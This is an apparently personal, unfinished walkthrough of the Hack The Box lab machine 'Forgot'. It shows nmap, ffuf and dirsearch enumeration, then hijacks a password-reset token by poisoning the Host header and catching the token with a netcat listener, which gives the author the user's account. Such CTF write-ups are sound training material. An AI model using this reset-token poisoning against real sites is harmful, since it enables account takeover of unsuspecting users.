HTB - Forgot

First of all I tried accessing the provided IP over port 80 and there you go:

![image](https://user-images.githubusercontent.com/51139868/217559897-d84e1cf2-33aa-4254-8e7c-b3b508508215.png)

Then I ran an nmap scan to get more info on the target:

```bash
└─$ sudo nmap -sC -sV 10.10.11.188    
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-06 18:44 EST
Nmap scan report for 10.10.11.188
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
|_http-title: Login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Fri, 06 Jan 2023 23:44:58 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 65720
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Fri, 06 Jan 2023 23:44:52 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 219
|     Location: http://127.0.0.1
|     X-Varnish: 32890
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://127.0.0.1">http://127.0.0.1</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Fri, 06 Jan 2023 23:44:52 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|     X-Varnish: 65716
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest, SIPOptions: 
|_    HTTP/1.1 400 Bad Request
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=1/6%Time=63B8B273%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,1E2,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.1\.2\x20
SF:Python/3\.8\.10\r\nDate:\x20Fri,\x2006\x20Jan\x202023\x2023:44:52\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:0219\r\nLocation:\x20http://127\.0\.0\.1\r\nX-Varnish:\x2032890\r\nAge:
SF:\x200\r\nVia:\x201\.1\x20varnish\x20\(Varnish/6\.2\)\r\nConnection:\x20
SF:close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>Redirecting\
SF:.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be\x20re
SF:directed\x20automatically\x20to\x20the\x20target\x20URL:\x20<a\x20href=
SF:\"http://127\.0\.0\.1\">http://127\.0\.0\.1</a>\.\x20If\x20not,\x20clic
SF:k\x20the\x20link\.\n")%r(HTTPOptions,117,"HTTP/1\.1\x20200\x20OK\r\nSer
SF:ver:\x20Werkzeug/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Fri,\x2006\x20J
SF:an\x202023\x2023:44:52\x20GMT\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\x20HEAD\r\nContent-Length:\x200\r\
SF:nX-Varnish:\x2065716\r\nAge:\x200\r\nVia:\x201\.1\x20varnish\x20\(Varni
SF:sh/6\.2\)\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\n")%
SF:r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(FourOh
SF:FourRequest,1BE,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeu
SF:g/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Fri,\x2006\x20Jan\x202023\x202
SF:3:44:58\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nConte
SF:nt-Length:\x20207\r\nX-Varnish:\x2065720\r\nAge:\x200\r\nVia:\x201\.1\x
SF:20varnish\x20\(Varnish/6\.2\)\r\nConnection:\x20close\r\n\r\n<!doctype\
SF:x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>No
SF:t\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20o
SF:n\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\
SF:x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n")
SF:%r(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I also ran ffuf for a basic enumeration, just in case:

```bash
─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://10.10.11.188/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.188/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 5189, Words: 762, Lines: 246, Duration: 221ms]
home                    [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 168ms]
tickets                 [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 158ms]
forgot                  [Status: 200, Size: 5227, Words: 766, Lines: 253, Duration: 7774ms]
                        [Status: 200, Size: 5188, Words: 761, Lines: 246, Duration: 169ms]
reset                   [Status: 200, Size: 5523, Words: 820, Lines: 261, Duration: 167ms]
:: Progress: [20116/20116] :: Job [1/1] :: 250 req/sec :: Duration: [0:01:33] :: Errors: 0 ::
```

Also dirsearch is a nice tool for web enumeration:

```bash
└─$ dirsearch -u http://10.10.11.188

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                           
 (_||| _) (/_(_|| (_| )                                                                                                    
                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/10.10.11.188/_23-01-06_19-07-36.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-01-06_19-07-36.log

Target: http://10.10.11.188/

[19:07:36] Starting: 
[19:08:38] 302 -  189B  - /home  ->  /                                      
[19:08:40] 200 -    5KB - /forgot                                           
[19:08:46] 200 -    5KB - /login                                            
[19:09:09] 200 -    5KB - /reset                                            
                                                                                                                           
Task Completed 
```

This looks like a valid username:

![image](https://user-images.githubusercontent.com/51139868/217560759-5a56a430-b333-43e8-a65b-f1e7453ea698.png)

Got a reset token using burp and setting the host as my machine's ip:

![image](https://user-images.githubusercontent.com/51139868/217560953-5c250265-19b1-425f-95b0-c8b9fa5d0be3.png)

``` bash
└─$ nc -lvnp 80  
listening on [any] 80 ...
connect to [10.10.14.153] from (UNKNOWN) [10.10.11.188] 58950
GET /reset?token=kaMdB0%2F2%2F5sveAfdUJ8FKk12vgKIctoEBSNvqoFerknByuYrEhJ%2FFbfaZeRRi2%2FSZyWsISI0J4lncmlDxWmfGA%3D%3D HTTP/1.1
Host: 10.10.14.153
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```
Used the token on the request to reset the password:

![image](https://user-images.githubusercontent.com/51139868/217561257-44f02500-2566-4166-b758-ba18f5c31ca4.png)

On the second try it worked out but the password seems to change real quick:

![image](https://user-images.githubusercontent.com/51139868/217561505-b3635dbd-a9f8-422e-81b8-dc2b34543cf7.png)


Logged in with the password 'teste' that i'd setten up on the previous step:

![image](https://user-images.githubusercontent.com/51139868/217561610-d90f635c-9861-489c-bb31-0b0f538fc9ee.png)

![image](https://user-images.githubusercontent.com/51139868/217562016-c5ef2eb0-6f5b-4b90-8272-a694c6fe4c66.png)

..................... to be continued
